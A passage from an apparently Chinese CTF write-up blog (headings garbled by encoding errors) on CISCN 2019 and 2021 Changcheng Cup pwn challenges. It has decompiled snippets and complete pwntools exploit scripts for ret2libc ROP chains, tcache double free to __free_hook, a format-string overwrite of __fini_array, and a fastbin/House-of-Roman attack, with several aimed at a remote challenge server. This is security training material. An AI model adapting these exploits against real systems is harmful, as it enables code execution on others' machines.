class="line">libc_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#malloc_hijack</span></span><br><span class="line">malloc_hook=libc_base+<span class="number">0x3ebc30</span></span><br><span class="line">edit(<span class="number">4</span>,p64(malloc_hook))<span class="comment">#edit tcache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#6 get malloc_hook</span></span><br><span class="line">edit(<span class="number">6</span>,p64(rwx_add))</span><br><span class="line"><span class="comment">#getflag</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019ä¸œåŒ—-PWN2"><a class="header-anchor" href="#CISCN-2019ä¸œåŒ—-PWN2">Â¶</a>CISCN 2019ä¸œåŒ— PWN2</h2>
<h3 id="IDAåˆ†æ"><a class="header-anchor" href="#IDAåˆ†æ">Â¶</a>IDAåˆ†æ</h3>
<p>encrypt å‡½æ•°ä¸­æœ‰ä¸ªæ ˆæº¢å‡ºï¼Œè¿™é¢˜ç›´æ¥ret2libc</p>
<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="2.png-39.5kB"></p>
<h3 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;/home/hgg/Desktop/pwn/pwn2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hgg/Desktop/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c82 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007f0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400aec : pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b9 : ret</span></span><br><span class="line"><span class="string">0x00000000004008ca : ret 0x2017</span></span><br><span class="line"><span class="string">0x0000000000400962 : ret 0x458b</span></span><br><span class="line"><span class="string">0x00000000004009c5 : ret 0xbf02</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 15</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;pwn2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28015</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">pop_4 = <span class="number">0x400c7c</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">payload</span>):</span></span><br><span class="line">	p = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">		x = <span class="built_in">chr</span>(x)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">96</span> <span class="keyword">or</span> <span class="built_in">ord</span>(x)&gt;<span class="number">122</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">64</span> <span class="keyword">or</span> <span class="built_in">ord</span>(x)&gt;<span class="number">90</span>:</span><br><span class="line">				<span class="keyword">if</span> <span class="built_in">ord</span>(x)&gt;<span class="number">47</span> <span class="keyword">and</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">57</span>:</span><br><span class="line">					x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xc</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xd</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xe</span>)</span><br><span class="line">		p += x</span><br><span class="line">	<span class="keyword">return</span>(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(encrypt(payload))</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_addr + <span class="number">0x1b3e9a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019ä¸œåŒ—-PWN3"><a class="header-anchor" href="#CISCN-2019ä¸œåŒ—-PWN3">Â¶</a>CISCN 2019ä¸œåŒ— PWN3</h2>
<h3 id="IDA-åˆ†æ"><a class="header-anchor" href="#IDA-åˆ†æ">Â¶</a>IDA åˆ†æ</h3>
<p>mainå‡½æ•°</p>
<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="5.png-36.5kB"></p>
<p>print_chk()æ˜æ˜¾æ˜¯ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
<p>è¿™ä¸ªé¢˜èƒ½ç”¨çš„å‡½æ•°å°±ä¸¤ä¸ª</p>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/dqyexxjen9e2l5hdeapnnpap/3.png" alt="3.png-31.2kB"></p>
<p>delete</p>
<p><img src="http://static.zybuluo.com/hgggg/nq6c5o48hap4cvvg7iz1vlj1/4.png" alt="4.png-22.6kB"></p>
<p>å­˜åœ¨UAF</p>
<h3 id="é¢˜ç›®æ€è·¯"><a class="header-anchor" href="#é¢˜ç›®æ€è·¯">Â¶</a>é¢˜ç›®æ€è·¯</h3>
<p>é¢˜ç›®ç»™çš„ç¯å¢ƒæ˜¯Ubuntu 18 glibc 2.27</p>
<p>è¿™é‡Œç›´æ¥å°±ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²libcåœ°å€å†tcachebin double free æ¥Getshell</p>
<h3 id="exp-v3"><a class="header-anchor" href="#exp-v3">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/hgg/Desktop/pwn27/pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/home/hgg/Desktop/pwn27/pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28046)</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,story</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,story)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span>)</span><br><span class="line">s = <span class="built_in">str</span>(p.recv(<span class="number">130</span>)).split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(s[<span class="number">7</span>],<span class="number">16</span>)-<span class="number">0x81237</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019ååŒ—-PWN1"><a class="header-anchor" href="#CISCN-2019ååŒ—-PWN1">Â¶</a>[CISCN 2019ååŒ—]PWN1</h2>
<h3 id="é¢˜ç›®æ€è·¯-v2"><a class="header-anchor" href="#é¢˜ç›®æ€è·¯-v2">Â¶</a>é¢˜ç›®æ€è·¯</h3>
<p>ç®€å•çš„æ ˆæº¢å‡º + ret2text</p>
<h3 id="exp-v4"><a class="header-anchor" href="#exp-v4">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;BBB&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;BBB&#x27;</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28049</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400501</span> </span><br><span class="line">pop_rdi = <span class="number">0x400793</span></span><br><span class="line">cat_flag = <span class="number">0x04007CC</span></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;number.&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(cat_flag)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040078c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400790 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400792 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005e0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400793 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400791 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400501 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019è¥¿å—-PWN1"><a class="header-anchor" href="#CISCN-2019è¥¿å—-PWN1">Â¶</a>[CISCN 2019è¥¿å—]PWN1</h2>
<h3 id="é¢˜ç›®åˆ†æ"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>æ¼æ´ç‚¹æ˜¯mainå‡½æ•°ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, &amp;format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mainå‡½æ•°åªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œä½†æ˜¯åœ¨å‡½æ•°é€€å‡ºçš„æ—¶å€™å›å»æ‰§è¡Œ__fini_arrayé‡Œçš„å‡½æ•°</p>
<p>ç”±äºé¢˜ç›®æ˜¯&quot;No RELRO&quot;æ‰€ä»¥__fini_arrayå¯è¯»å¯å†™</p>
<p>æ‰€ä»¥æœ¬é¢˜å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™æ¥åŒæ—¶å°†__fini_array[0]å†™ä¸ºmain,printf_gotå†™ä¸ºsystem_plt</p>
<h3 id="exp-v5"><a class="header-anchor" href="#exp-v5">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;CCC&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;CCC&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28060</span>)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#0x80483D0 </span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment">#0x8048534 </span></span><br><span class="line">printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">fini = <span class="number">0x0804979C</span></span><br><span class="line"></span><br><span class="line">payload = p32(fini+ <span class="number">2</span>) + p32(printf+<span class="number">2</span>) + p32(printf) + p32(fini)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x0804 - 0x10) + &quot;c%4$hn&quot;    #0804 </span></span><br><span class="line"><span class="string">payload += &quot;%5$hn&quot;                                #0804 </span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x83D0 - 0x0804) + &quot;c%6$hn&quot;  #83D0</span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x8534 - 0x83D0) + &quot;c%7$hn&quot;  #8534</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;%2036c%4$hn%5$hn%31692c%6$hn%356c%7$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-é•¿åŸæ¯é™¢æ ¡ç»„-king-in-heap-1"><a class="header-anchor" href="#2021-é•¿åŸæ¯é™¢æ ¡ç»„-king-in-heap-1">Â¶</a>[2021 é•¿åŸæ¯é™¢æ ¡ç»„]king_in_heap_1</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v2"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v2">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.uaf
2.fastbin attack
3.House-of-Roman
</code></pre>
<h3 id="æ¼æ´åˆ†æ"><a class="header-anchor" href="#æ¼æ´åˆ†æ">Â¶</a>æ¼æ´åˆ†æ</h3>
<p>delete å‡½æ•°å­˜åœ¨uaf</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  index = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">10</span> || !heaparray[index] || !lenarray[index] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)heaparray[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶ç»™å‡ºäº†printfçš„å3ä½</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="keyword">unsigned</span> __int64)&amp;<span class="built_in">printf</span> &amp; <span class="number">0xFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è§£é¢˜æ­¥éª¤"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤">Â¶</a>è§£é¢˜æ­¥éª¤</h3>
<h4 id="Step1-leak-libc"><a class="header-anchor" href="#Step1-leak-libc">Â¶</a>Step1 leak libc</h4>
<p>é¦–å…ˆåˆ©ç”¨ç»™å‡ºçš„printfçš„åä¸‰ä½è®¡ç®—å‡ºstderr+157çš„åœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gift()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">stderr_157 = printf + <span class="number">0x36fdcd</span></span><br></pre></td></tr></table></figure>
<p>stderr+157:è¿™ä¸ªåç§»æ˜¯å›ºå®šï¼Œåœ¨2.23ç‰ˆæœ¬çš„libcä¸­ï¼Œä¹‹åå¡«å……0x33å°±å¯ä»¥æ”»å‡»stdoutç»“æ„ä½“ï¼Œä»è€Œå¯ä»¥åˆ¶é€ æ³„éœ²å‡ºstderr+192 çš„åœ°å€</p>
<p>ä¹‹åå°±æ˜¯ç»“åˆfastbin attackæ³„éœ²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)  <span class="comment">#add from unsortedbin</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stderr_157)[:<span class="number">3</span>]) <span class="comment">#edit unsortedbin fd</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x3c5600</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ®µpaylaodçš„å†™æ³•å¯ä»¥å‚è€ƒï¼š<a href="https://www.jianshu.com/p/27152c14e2e7">https://www.jianshu.com/p/27152c14e2e7</a></p>
<h4 id="Step2-åŠ«æŒmalloc-hook-get-shell"><a class="header-anchor" href="#Step2-åŠ«æŒmalloc-hook-get-shell">Â¶</a>Step2 åŠ«æŒmalloc_hook get shell</h4>
<p>è¿™é‡Œåˆ©ç”¨æ–¹æ³•å‚è€ƒï¼š<a href="https://blog.csdn.net/seaaseesa/article/details/103057937">https://blog.csdn.net/seaaseesa/article/details/103057937</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook_offset = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] -<span class="number">0x23</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(malloc_hook_offset))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="EXP"><a class="header-anchor" href="#EXP">Â¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;EEE&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;EEE&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)  </span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;context:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">stderr_157 = printf + <span class="number">0x36fdcd</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)  <span class="comment">#add from unsortedbin</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stderr_157)[:<span class="number">3</span>])</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span 